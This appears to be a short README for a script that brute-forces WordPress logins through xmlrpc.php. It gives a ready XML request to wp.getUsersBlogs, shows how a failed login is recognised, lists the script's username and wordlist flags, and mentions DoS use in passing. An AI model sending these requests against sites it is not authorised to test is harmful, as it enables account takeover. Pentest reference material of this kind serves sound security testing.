# XMLRPC.php Wordpress Bruteforce

If **xmlrpc.php** is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources.

To see if is active try to access to **/xmlrpc.php** and send this request:

# Credentials Bruteforce

``wp.getUserBlogs``, ``wp.getCategories`` or ``metaWeblog.getUsersBlogs`` are some methods thta can be used to brute-force credentials.
If you can find any of them you can send something like:

```xml
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>username</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```

The message "Incorrect username or password" inside a 200 code response should appear if the credentiales aren't valid.

So with the Script you can Bruteforce this, with the flags:

**u** --> Username;

**w** --> Path to Wordlist

Credits of the information: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress

The person who wrote the entire part of the Script: https://twitch.tv/s4vitar


